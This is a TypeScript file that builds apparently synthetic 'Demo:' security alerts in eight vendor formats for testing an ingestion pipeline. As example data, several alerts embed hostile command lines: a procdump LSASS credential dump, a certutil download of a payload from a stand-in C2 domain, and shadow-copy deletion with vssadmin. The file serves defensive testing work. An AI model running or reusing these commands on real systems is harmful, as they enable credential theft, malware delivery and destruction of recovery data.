/**
 * Sample Cybersecurity Alert Payloads for Ingestion Testing.
 *
 * Provides realistic, raw vendor alert payloads from famous cybersecurity tools:
 *  - CrowdStrike Falcon
 *  - Microsoft Defender for Endpoint
 *  - SentinelOne Singularity
 *  - AWS GuardDuty
 *  - Wazuh SIEM / HIDS
 *  - Splunk Enterprise Security
 *  - Palo Alto Networks Cortex XDR
 *  - Okta Identity Cloud
 *
 * Each alert JSON includes:
 *  - Top-level "source" field naming the tool/source for logo resolution
 *  - "Demo: " prefix at the start of titles and detection descriptions
 *  - Rich, detailed technical descriptions with process lineage, network context,
 *    identities, and MITRE ATT&CK techniques.
 */

export interface SampleAlert {
  id: string;
  sourceName: string;
  productName: string;
  title: string;
  severity: string;
  description: string;
  payload: Record<string, any>;
}

let __sampleCounter = 0;
let __lastSourceIndex = -1;

const getUniqueFindingUid = (prefix: string): string => {
  __sampleCounter += 1;
  const rand = Math.random().toString(36).slice(2, 7);
  return `${prefix}-${Date.now()}-${__sampleCounter}-${rand}`;
};

type AlertBuilder = () => SampleAlert;

const ALERT_BUILDERS: AlertBuilder[] = [
  // 1. CrowdStrike Falcon
  () => {
    const findingUid = getUniqueFindingUid('cs-falcon');
    const description =
      'Demo: CrowdStrike Falcon detected an unbacked memory dump attempt targeting the Local Security Authority Subsystem Service (LSASS.exe) by suspicious process "procdump64.exe" (PID 4812, Parent PID 1204 - cmd.exe). The process was launched from "C:\\Windows\\Temp\\procdump64.exe" with arguments "-accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp". The user context was identified as CORP\\admin_backup on host WS-CORP-492 (IP 10.120.4.52). Prior to dumping, the binary initiated an outbound TLS handshake to 194.26.29.112:443. Falcon OverWatch flagged this behavior as high-confidence credential harvesting (T1003.001). Falcon Host sensor prevented execution and quarantined the generated memory artifact.';

    const rawPayload = {
      source: 'CrowdStrike Falcon',
      title: 'Demo: CrowdStrike - Credential Dumping via LSASS Memory Read (ProcDump)',
      description,
      message: description,
      metadata: {
        customerIDString: 'c8d8f0e1a2b3c4d5e6f7',
        offset: 10245,
        eventType: 'DetectionSummaryEvent',
        eventCreationTime: Date.now(),
        version: '1.0',
      },
      event: {
        SensorId: `aid-${findingUid}`,
        ComputerName: 'WS-CORP-492',
        UserName: 'admin_backup',
        DetectName: 'Demo: Credential Dumping: LSASS (ProcDump)',
        DetectDescription: description,
        Description: description,
        Severity: 4,
        SeverityName: 'High',
        FalconHostLink: `https://falcon.crowdstrike.com/activity/detections/detail/${findingUid}`,
        FileName: 'procdump64.exe',
        FilePath: 'C:\\Windows\\Temp\\procdump64.exe',
        CommandLine: 'procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp',
        MD5String: 'e2fc714c4727ee9395f324cd61752eb7',
        SHA256String: '8f48102ff9373cf58bb0e0cf47385be617b0190a6e355c7f8a75e330a6566897',
        LocalIP: '10.120.4.52',
        RemoteIP: '194.26.29.112',
        ProcessId: 4812,
        ParentProcessId: 1204,
        Tactic: 'Credential Access',
        Technique: 'OS Credential Dumping: LSASS Memory (T1003.001)',
      },
    };

    return {
      id: findingUid,
      sourceName: 'CrowdStrike Falcon',
      productName: 'CrowdStrike',
      title: 'Demo: CrowdStrike - Credential Dumping via LSASS Memory Read (ProcDump)',
      severity: 'High',
      description,
      payload: rawPayload,
    };
  },

  // 2. Microsoft Defender for Endpoint
  () => {
    const findingUid = getUniqueFindingUid('mde');
    const nowIso = new Date().toISOString();
    const description =
      'Demo: Microsoft Defender for Endpoint detected a Living-off-the-Land (LotL) binary abuse involving certutil.exe on host FIN-APP-02.internal.corp (10.20.1.88). The process executed "certutil.exe -urlcache -split -f https://c2.threat-actor-ops.org/stage2.bin C:\\Windows\\Temp\\update.bin" under user context sarah.chen@corp.example.com. Destination IP 198.51.100.77 matches an active threat cluster delivering Cobalt Strike beacons. Defender Antivirus blocked the secondary execution of update.bin upon detecting an encoded shellcode header. The endpoint has been marked for automated network containment.';

    const rawPayload = {
      source: 'Microsoft Defender for Endpoint',
      id: `da-${Date.now()}-def`,
      provider: 'Microsoft Defender for Endpoint',
      title: 'Demo: Defender - Living-off-the-Land Binary (Certutil) Remote Payload Download',
      description,
      message: description,
      category: 'CommandAndControl',
      severity: 'High',
      status: 'NewAlert',
      alertCreationTime: nowIso,
      computerDnsName: 'FIN-APP-02.internal.corp',
      machineDetails: {
        computerDnsName: 'FIN-APP-02.internal.corp',
        ipAddresses: ['10.20.1.88'],
        osPlatform: 'Windows11',
      },
      evidence: [
        {
          entityType: 'Process',
          commandLine: 'certutil.exe -urlcache -split -f https://c2.threat-actor-ops.org/stage2.bin C:\\Windows\\Temp\\update.bin',
        },
        { entityType: 'Ip', ipAddress: '198.51.100.77' },
        { entityType: 'Url', url: 'https://c2.threat-actor-ops.org/stage2.bin' },
        { entityType: 'User', accountName: 'sarah.chen@corp.example.com' },
      ],
      mitreTechniques: ['T1105', 'T1059.001'],
    };

    return {
      id: findingUid,
      sourceName: 'Microsoft Defender for Endpoint',
      productName: 'Microsoft Defender for Endpoint',
      title: 'Demo: Defender - Living-off-the-Land Binary (Certutil) Remote Payload Download',
      severity: 'High',
      description,
      payload: rawPayload,
    };
  },

  // 3. SentinelOne Singularity
  () => {
    const findingUid = getUniqueFindingUid('s1');
    const nowIso = new Date().toISOString();
    const description =
      'Demo: SentinelOne Behavioral AI engine detected unauthorized shadow copy deletion attempting to inhibit system recovery on HR-DESKTOP-19 (10.0.12.44). Process "vssadmin.exe" (PID 6108) was spawned by an unsigned PowerShell script from "%APPDATA%\\Local\\Temp\\invoke-enc.ps1" executing "vssadmin.exe delete shadows /all /quiet". Subsequent activity attempted to tamper with Windows Defender services and bcdedit boot configuration. SentinelOne Singularity Storyline (Root ID: S1-SL-8921) correlated this activity with pre-ransomware staging (T1490). The engine triggered automated rollback mitigation, terminating the process tree and restoring modified system files.';

    const rawPayload = {
      source: 'SentinelOne Singularity',
      title: 'Demo: SentinelOne - Ransomware Behavior (Volume Shadow Copy Deletion)',
      description,
      message: description,
      threatInfo: {
        threatId: `S1-THREAT-${Date.now().toString().slice(-6)}`,
        threatName: 'Demo: Ransomware.ShadowCopy.Delete',
        classification: 'Ransomware',
        confidenceLevel: 'malicious',
        incidentStatus: 'unresolved',
        severity: 'critical',
        identifiedAt: nowIso,
        description,
        filePath: 'C:\\Windows\\System32\\vssadmin.exe',
        fileSha256: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
        commandLine: 'vssadmin.exe delete shadows /all /quiet',
        mitreTactics: ['Impact', 'Inhibit System Recovery'],
      },
      agentRealtimeInfo: {
        agentComputerName: 'HR-DESKTOP-19',
        agentIp: '10.0.12.44',
        agentOsName: 'Windows 11 Enterprise',
        userContext: 'alex.morgan',
      },
    };

    return {
      id: findingUid,
      sourceName: 'SentinelOne Singularity',
      productName: 'SentinelOne',
      title: 'Demo: SentinelOne - Ransomware Behavior (Volume Shadow Copy Deletion)',
      severity: 'Critical',
      description,
      payload: rawPayload,
    };
  },

  // 4. AWS GuardDuty
  () => {
    const findingUid = getUniqueFindingUid('guardduty');
    const nowIso = new Date().toISOString();
    const description =
      'Demo: AWS GuardDuty detected an anomalous volume of failed SSH login attempts originating from external IP address 198.51.100.23 (Hostwinds LLC, Bucharest, RO) targeting bastion host instance i-0f8a91b2c3d4e5f60 (172.31.40.12) in us-east-1. Over 1,420 failed authentication attempts using common dictionary accounts (root, ubuntu, deploy, test) were recorded within a 15-minute window via VPC Flow Logs. The source IP is categorized under threat intelligence feeds as an active automated brute-force scanner. No successful credentials were observed during this period, but inbound security group rules currently permit port 22 access from 0.0.0.0/0.';

    const rawPayload = {
      source: 'AWS GuardDuty',
      title: 'Demo: GuardDuty - UnauthorizedAccess:EC2/SSHBruteForce Against Bastion',
      description,
      message: description,
      version: '0',
      id: `gd-${Date.now().toString().slice(-6)}-2026`,
      'detail-type': 'GuardDuty Finding',
      account: '982341123901',
      time: nowIso,
      region: 'us-east-1',
      detail: {
        schemaVersion: '2.0',
        accountId: '982341123901',
        region: 'us-east-1',
        type: 'UnauthorizedAccess:EC2/SSHBruteForce',
        title: 'Demo: SSH brute force attack against EC2 bastion host',
        description,
        severity: 7.5,
        resource: {
          resourceType: 'Instance',
          instanceDetails: {
            instanceId: 'i-0f8a91b2c3d4e5f60',
            instanceType: 't3.medium',
            networkInterfaces: [{ privateIpAddress: '172.31.40.12' }],
          },
        },
        service: {
          serviceName: 'guardduty',
          action: {
            actionType: 'NETWORK_CONNECTION',
            networkConnectionAction: {
              connectionDirection: 'INBOUND',
              remoteIpDetails: {
                ipAddressV4: '198.51.100.23',
                organization: { org: 'Hostwinds LLC' },
                country: { countryName: 'Romania' },
              },
            },
          },
        },
      },
    };

    return {
      id: findingUid,
      sourceName: 'AWS GuardDuty',
      productName: 'AWS GuardDuty',
      title: 'Demo: GuardDuty - UnauthorizedAccess:EC2/SSHBruteForce Against Bastion',
      severity: 'High',
      description,
      payload: rawPayload,
    };
  },

  // 5. Wazuh SIEM / HIDS
  () => {
    const findingUid = getUniqueFindingUid('wazuh');
    const nowIso = new Date().toISOString();
    const description =
      'Demo: Wazuh Host-Based IDS and Sysmon integration detected persistent Command and Control (C2) beaconing activity on endpoint FIN-LAPTOP-04 (10.0.1.42). Process "msedge_proxy.exe" (SHA256: 9f8337a6b29f984a1e95642a420b98a3c8e47b3127814b721e25e709a34bc362) located at "%APPDATA%\\Roaming\\Microsoft\\Edge\\" established regular HTTPS connections every 45 seconds (jitter 10%) to external IP 194.26.29.112:8443. Memory forensics identified this executable as a masqueraded Sliver C2 Go-compiled implant. Wazuh Rule 100221 (Level 12) triggered due to repeated irregular beaconing patterns and masquerading of legitimate Microsoft Edge binaries.';

    const rawPayload = {
      source: 'Wazuh',
      title: 'Demo: Wazuh - Sliver C2 Implant Beaconing on FIN-LAPTOP-04',
      description,
      message: description,
      timestamp: nowIso,
      rule: {
        id: '100221',
        level: 12,
        description,
        firedtimes: 1,
        mail: false,
        groups: ['malware', 'c2', 'exploit'],
      },
      agent: {
        id: '002',
        name: 'FIN-LAPTOP-04',
        ip: '10.0.1.42',
      },
      manager: {
        name: 'wazuh.manager',
      },
      id: `${Date.now() / 1000}.991204`,
      decoder: { name: 'sysmon' },
      data: {
        srcip: '194.26.29.112',
        dstuser: 'sarah.chen',
        sha256: '9f8337a6b29f984a1e95642a420b98a3c8e47b3127814b721e25e709a34bc362',
        system: {
          process: {
            name: 'msedge_proxy.exe',
            command_line: '%APPDATA%\\Roaming\\Microsoft\\Edge\\msedge_proxy.exe',
          },
        },
      },
      full_log: `Sysmon Event 1: Image: msedge_proxy.exe CommandLine: %APPDATA%\\Roaming\\Microsoft\\Edge\\msedge_proxy.exe ParentImage: explorer.exe. Destination: 194.26.29.112:8443. ${description}`,
    };

    return {
      id: findingUid,
      sourceName: 'Wazuh',
      productName: 'Wazuh',
      title: 'Demo: Wazuh - Sliver C2 Implant Beaconing on FIN-LAPTOP-04',
      severity: 'Critical',
      description,
      payload: rawPayload,
    };
  },

  // 6. Splunk Enterprise Security
  () => {
    const findingUid = getUniqueFindingUid('splunk-es');
    const description =
      'Demo: Splunk Enterprise Security Notable Event generated by correlation search "Impossible Travel Activity Detected". User account "r.sterling@corp.example.com" authenticated successfully via Okta SSO from Oslo, Norway (IP 84.212.10.44) at 14:02 UTC, followed 11 minutes later by an authentication attempt from Lagos, Nigeria (IP 185.220.101.5 - known Tor exit node) at 14:13 UTC. The calculated physical distance is 5,420 km, requiring a minimum travel speed of ~29,500 km/h, which is physically impossible. Risk score adjusted to 85; identity provider session revoked and adaptive authentication MFA challenge issued.';

    const rawPayload = {
      source: 'Splunk Enterprise Security',
      title: 'Demo: Splunk ES - Impossible Travel - Concurrent Logins Across Countries',
      description,
      message: description,
      sid: `scheduler__admin__SplunkEnterpriseSecuritySuite__RMD${Date.now().toString().slice(-6)}`,
      search_name: 'Demo: Notable Event - Impossible Travel Activity Detected',
      app: 'SplunkEnterpriseSecuritySuite',
      owner: 'admin',
      results_link: 'https://splunk.internal.corp/app/SplunkEnterpriseSecuritySuite/@go?sid=scheduler__admin__SplunkEnterpriseSecuritySuite',
      result: {
        event_id: `SPLK-NOTABLE-${Date.now().toString().slice(-5)}`,
        urgency: 'high',
        status: 'new',
        src: '185.220.101.5',
        user: 'r.sterling@corp.example.com',
        dest: 'identity.corp.example.com',
        description,
        signature: 'Demo: Concurrent Logins from Distant Geographies (Oslo, NO & Lagos, NG within 12 minutes)',
        _time: `${Math.floor(Date.now() / 1000)}`,
      },
    };

    return {
      id: findingUid,
      sourceName: 'Splunk Enterprise Security',
      productName: 'Splunk ES',
      title: 'Demo: Splunk ES - Impossible Travel - Concurrent Logins Across Countries',
      severity: 'High',
      description,
      payload: rawPayload,
    };
  },

  // 7. Palo Alto Networks Cortex XDR
  () => {
    const findingUid = getUniqueFindingUid('cortex-xdr');
    const description =
      'Demo: Palo Alto Networks Cortex XDR behavioral analytics engine detected and blocked an unbacked memory injection into the Local Security Authority Subsystem Service (lsass.exe, PID 720) on Domain Controller CORP-DC-01. Source process "mimikatz.exe" (SHA256: 3a7b1c4e8f9a2b5c6d7e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c) was invoked by service account "SVC_BACKUP" via scheduled task "BackupMaintenance". Cortex XDR agent terminated the injecting thread, isolated the binary, and triggered an endpoint triage dump. Associated alerts confirm prior reconnaissance commands ("whoami /priv", "nltest /dclist") executed 3 minutes prior.';

    const rawPayload = {
      source: 'Palo Alto Networks Cortex XDR',
      title: 'Demo: Cortex XDR - Mimikatz LSASS In-Memory Dump Blocked',
      description,
      message: description,
      incident: {
        incident_id: `XDR-INC-${Date.now().toString().slice(-5)}`,
        incident_name: 'Demo: Suspicious Memory Injection into LSASS.exe',
        creation_time: Date.now(),
        modification_time: Date.now(),
        status: 'new',
        severity: 'high',
        description,
        hosts: ['CORP-DC-01'],
        users: ['SVC_BACKUP'],
        alert_count: 1,
        alerts: [
          {
            alert_id: `AL-${Date.now().toString().slice(-5)}`,
            action: 'BLOCKED',
            name: 'Demo: Mimikatz LSASS In-Memory Dump Blocked',
            description,
            category: 'Credential Access',
            host_name: 'CORP-DC-01',
            user_name: 'SVC_BACKUP',
            process_name: 'mimikatz.exe',
            sha256: '3a7b1c4e8f9a2b5c6d7e8f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c',
          },
        ],
      },
    };

    return {
      id: findingUid,
      sourceName: 'Palo Alto Networks Cortex XDR',
      productName: 'Cortex XDR',
      title: 'Demo: Cortex XDR - Mimikatz LSASS In-Memory Dump Blocked',
      severity: 'High',
      description,
      payload: rawPayload,
    };
  },

  // 8. Okta Identity Cloud
  () => {
    const findingUid = getUniqueFindingUid('okta');
    const nowIso = new Date().toISOString();
    const description =
      'Demo: Okta ThreatInsight and Identity Threat Protection detected an MFA fatigue / push notification bombing attack targeting user "devops-admin@corp.example.com" (Alex Vance, ID: 00u8f192bka). The attacker, having obtained valid primary credentials, initiated 24 consecutive Okta Verify push challenges within a 90-second window from IP 194.26.29.5 (Seychelles, Anonymous VPN/Hosting provider AS208046). The user rejected 8 consecutive pushes before Okta adaptive rate-limiting triggered an automated account lock and denied further access. ThreatInsight flagged the source ASN as associated with credential stuffing infrastructure.';

    const rawPayload = {
      source: 'Okta',
      title: 'Demo: Okta - High-Risk MFA Push Fatigue Bombing',
      description,
      message: description,
      eventId: `targets-okta-${Date.now().toString().slice(-6)}`,
      eventType: 'user.mfa.push.spam_detected',
      published: nowIso,
      severity: 'WARN',
      displayMessage: description,
      actor: {
        id: '00u8f192bka',
        type: 'User',
        alternateId: 'devops-admin@corp.example.com',
        displayName: 'Alex Vance',
      },
      client: {
        ipAddress: '194.26.29.5',
        geographicalContext: {
          city: 'Victoria',
          country: 'Seychelles',
        },
      },
      securityContext: {
        isProxy: true,
      },
      outcome: {
        result: 'DENY',
        reason: 'Push flood limit exceeded',
      },
    };

    return {
      id: findingUid,
      sourceName: 'Okta',
      productName: 'Okta',
      title: 'Demo: Okta - High-Risk MFA Push Fatigue Bombing',
      severity: 'Medium',
      description,
      payload: rawPayload,
    };
  },
];

/**
 * Returns a fresh sample alert, cycling semi-randomly through the assortment of
 * famous cybersecurity alert sources without repeating the same source consecutively.
 */
export const getNextSampleAlert = (): SampleAlert => {
  const count = ALERT_BUILDERS.length;
  let nextIndex: number;

  if (__lastSourceIndex < 0) {
    // Pick an initial random source
    nextIndex = Math.floor(Math.random() * count);
  } else {
    // Choose randomly from any index except the immediately preceding one
    const offset = 1 + Math.floor(Math.random() * (count - 1));
    nextIndex = (__lastSourceIndex + offset) % count;
  }

  __lastSourceIndex = nextIndex;
  return ALERT_BUILDERS[nextIndex]();
};
